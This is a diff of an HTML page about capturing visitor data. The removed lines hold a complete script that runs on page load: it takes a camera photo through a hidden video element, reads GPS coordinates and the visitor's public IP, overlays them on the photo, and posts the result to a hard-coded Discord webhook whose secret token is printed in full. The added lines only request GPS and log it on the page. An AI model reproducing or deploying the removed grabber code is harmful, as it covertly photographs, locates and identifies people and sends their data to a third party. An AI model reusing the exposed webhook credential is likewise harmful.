@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Capture Data</title>
+  <title>Data Capture with GPS</title>
   <style>
     body {
       margin: 0;
@@ -18,8 +18,14 @@
       color: white;
       text-align: center;
     }
-    canvas {
-      display: none;
+    #message {
+      font-family: Arial, sans-serif;
+      font-size: 18px;
+      margin-bottom: 20px;
+      padding: 10px;
+      background-color: rgba(0, 0, 0, 0.5);
+      border: 1px solid white;
+      border-radius: 5px;
     }
     #console {
       background-color: rgba(0, 0, 0, 0.7);
@@ -31,17 +37,16 @@
       height: 200px;
       overflow-y: auto;
       border: 1px solid white;
-      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas"></canvas>
+  <div id="message">Initializing... Please allow permissions if prompted.</div>
   <div id="console"></div>
 
   <script>
     const debugConsole = document.getElementById("console");
+    const messageDiv = document.getElementById("message");
 
     function logMessage(message) {
       const timestamp = new Date().toISOString();
@@ -50,99 +55,79 @@
       console.log(message);
     }
 
+    function updateMessage(text) {
+      messageDiv.innerText = text;
+    }
+
+    async function getGPSLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          logMessage("Geolocation is not supported by this browser.");
+          updateMessage("Your browser does not support GPS.");
+          reject(new Error("Geolocation not supported"));
+          return;
+        }
+
+        logMessage("Requesting high-accuracy GPS location...");
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const { latitude, longitude } = position.coords;
+            logMessage(`GPS location acquired: Latitude ${latitude}, Longitude ${longitude}`);
+            updateMessage("GPS location acquired.");
+            resolve(position);
+          },
+          error => {
+            let errorMessage;
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                errorMessage = "User denied GPS permission.";
+                break;
+              case error.POSITION_UNAVAILABLE:
+                errorMessage = "GPS position unavailable.";
+                break;
+              case error.TIMEOUT:
+                errorMessage = "GPS request timed out.";
+                break;
+              default:
+                errorMessage = "An unknown error occurred.";
+            }
+            logMessage(`GPS Error: ${errorMessage}`);
+            updateMessage(errorMessage);
+            reject(new Error(errorMessage));
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 20000, // Allow up to 20 seconds for a response
+            maximumAge: 0,
+          }
+        );
+      });
+    }
+
     async function main() {
-      const webhookURL = "https://discord.com/api/webhooks/1270166449318793296/eJjxv6udxX13mJVpn5ubPqzYQMI9-Xue9G0LAelkswYqcDVVgZp0cLfHXb55RkaPw_w2";
-
       logMessage("Initializing...");
-
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      const ctx = canvas.getContext("2d");
+      updateMessage("Starting data capture...");
 
       try {
-        // Access camera
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        logMessage("Camera accessed.");
-
-        // Wait for video metadata to load
-        await new Promise(resolve => (video.onloadedmetadata = resolve));
-
-        // Capture image
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL("image/png");
-        logMessage("Image captured.");
-
-        // Stop video stream
-        stream.getTracks().forEach(track => track.stop());
-        logMessage("Camera stream stopped.");
-
-        // Get user location
-        logMessage("Fetching GPS location...");
-        const position = await new Promise((resolve, reject) =>
-          navigator.geolocation.getCurrentPosition(resolve, reject)
-        );
+        // Request GPS Location
+        const position = await getGPSLocation();
         const { latitude, longitude } = position.coords;
-        logMessage(`Location fetched: Latitude ${latitude}, Longitude ${longitude}`);
 
-        // Get user IP
-        logMessage("Fetching IP address...");
-        const ipResponse = await fetch("https://api64.ipify.org?format=json");
-        const { ip } = await ipResponse.json();
-        logMessage(`IP address fetched: ${ip}`);
+        logMessage(`Latitude: ${latitude}, Longitude: ${longitude}`);
+        updateMessage("GPS data captured successfully.");
 
-        // Overlay data on image
-        ctx.fillStyle = "red";
-        ctx.font = "24px Arial";
-        ctx.fillText(`IP: ${ip}`, 10, canvas.height - 50);
-        ctx.fillText(`Lat: ${latitude.toFixed(6)}`, 10, canvas.height - 30);
-        ctx.fillText(`Long: ${longitude.toFixed(6)}`, 10, canvas.height - 10);
-        const finalImage = canvas.toDataURL("image/png");
-
-        // Convert base64 image to Blob
-        const base64Data = finalImage.split(',')[1];
-        const byteCharacters = atob(base64Data);
-        const byteNumbers = Array.from(byteCharacters).map(char => char.charCodeAt(0));
-        const byteArray = new Uint8Array(byteNumbers);
-        const imageBlob = new Blob([byteArray], { type: 'image/png' });
-
-        // Prepare FormData
-        logMessage("Preparing data for webhook...");
-        const formData = new FormData();
-        formData.append("file", imageBlob, "captured_image.png");
-        formData.append("payload_json", JSON.stringify({
-          content: "Captured user data:",
-          embeds: [
-            {
-              title: "User Data",
-              description: `IP: ${ip}\nLatitude: ${latitude}\nLongitude: ${longitude}`,
-              color: 16711680
-            }
-          ]
-        }));
-
-        // Send data to webhook
-        logMessage("Sending data to Discord webhook...");
-        const response = await fetch(webhookURL, {
-          method: "POST",
-          body: formData
-        });
-
-        if (response.ok) {
-          logMessage("Data sent successfully to Discord.");
-        } else {
-          const errorText = await response.text();
-          logMessage(`Failed to send data: ${response.status} ${response.statusText} - ${errorText}`);
-        }
       } catch (error) {
         logMessage(`Error: ${error.message}`);
+        updateMessage("Failed to capture GPS data. Check permissions.");
         console.error(error);
       }
     }
 
-    main();
+    main().catch(error => {
+      console.error("Critical error:", error);
+      logMessage("Critical error occurred. See console for details.");
+      updateMessage("An unexpected error occurred.");
+    });
   </script>
 </body>
 </html>
